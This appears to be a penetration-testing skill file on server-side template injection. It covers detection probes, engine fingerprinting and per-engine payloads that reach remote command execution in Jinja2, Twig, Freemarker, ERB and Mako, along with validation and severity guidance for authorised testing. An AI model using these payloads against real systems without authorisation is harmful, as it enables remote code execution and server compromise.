---
name: ssti-testing
description: Test applications for Server-Side Template Injection — where user input is embedded into a server-side template and evaluated, often escalating to RCE. Covers polyglot detection, template-engine fingerprinting, and per-engine exploitation (Jinja2, Twig, Freemarker, Velocity, ERB, Mako). OWASP A05:2025 Injection. Use wherever user input appears in rendered output that a template engine processes.
---

# Server-Side Template Injection (SSTI)

SSTI happens when user input is concatenated into a template that the server then evaluates, letting an attacker inject template syntax that runs on the server — frequently a direct path to RCE. Methodology (per OWASP WSTG): **detect → identify the engine → exploit**. Suspect it in anything that renders dynamic content from input: email/notification templates, customizable reports/invoices, "personalize with your name", CMS themes, subject/body builders, and error pages that echo input.

## 1. Detect

- **Math probe** in a plaintext context: inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`. If the response shows `49`, the input is being evaluated server-side → SSTI confirmed (this distinguishes SSTI from plain XSS, where `{{7*7}}` renders literally).
- **Polyglot probe** (single-shot, ranked a top web-hacking technique of 2025): inject a string mixing many template syntaxes, e.g. `${{<%[%'"}}%\`. If the server throws a 500/exception or mangles the response instead of echoing it literally, template processing is reaching your input — then narrow down.

## 2. Identify the engine

Different engines share `{{...}}`/`${...}` but differ on edge cases. Distinguish with targeted probes:
- `{{7*'7'}}` → `7777777` in **Jinja2** (Python), `49` in **Twig** (PHP).
- `${7*7}` works in **Freemarker**/**Velocity** (Java), **Mako** (Python).
- `<%= 7*7 %>` → **ERB** (Ruby).
- `#{7*7}` → **Ruby**/some engines.
- Use the Hackmanit Template Injection Table / PayloadsAllTheThings decision tree to map response behavior to one of the ~44 known engines. Correct identification is critical — exploitation payloads are engine-specific.

## 3. Exploit (toward RCE)

Once the engine is known, walk from expression eval to command execution using that engine's object model. General shapes (adapt to engine and sandbox):
- **Jinja2 (Python)**: traverse `{{ ''.__class__.__mro__ }}` / `{{ cycler.__init__.__globals__ }}` to reach `os`/`subprocess`; modern payloads use `lipsum`, `cycler`, `request` globals to bypass filters.
- **Twig (PHP)**: `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}`.
- **Freemarker (Java)**: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
- **Velocity (Java)**: use `$class`/`ClassTool` reflection chains to `Runtime.exec`.
- **ERB (Ruby)**: `<%= system("id") %>` / backticks.
- **Mako (Python)**: `${self.module.cache.util.os.system("id")}` or `<%import os%>` blocks.

Confirm RCE with a benign `id`/OOB callback (see [[command-injection]] for confirmation discipline). Respect sandboxes — some engines run sandboxed; report the sandbox-escape requirement honestly.

## Notes & pitfalls

- **SSTI vs XSS**: if `{{7*7}}` shows `49` it's server-side (SSTI); if it shows `{{7*7}}` but `<script>` executes, it's client-side (see [[xss-testing]]). Client-side template injection in Angular/Vue is a separate, browser-side issue.
- Test both plaintext and attribute/tag contexts — evaluation may only trigger in specific positions.
- Blind SSTI: if no output, use error-based differences or OOB (DNS/HTTP) from within the payload to confirm.

## Validation — avoid false positives

- Require arithmetic/string evaluation proof (`49`, `7777777`) — a reflected literal is not SSTI.
- Before claiming RCE, land a real `id` output or OOB callback; don't assume the exploitation chain works just because the engine is identified.
- Confirm the math result isn't a coincidental value already present in the page.

## Severity guidance

- **Critical**: SSTI escalated to confirmed RCE.
- **High**: SSTI with server-side data/file access or a clear RCE path blocked only by a weak sandbox.
- **Medium**: confirmed expression evaluation with no demonstrated escalation yet.

## References

- OWASP WSTG v4.2 — 4.7.6 Testing for SSTI
- PayloadsAllTheThings — Server Side Template Injection; Hackmanit Template Injection Table
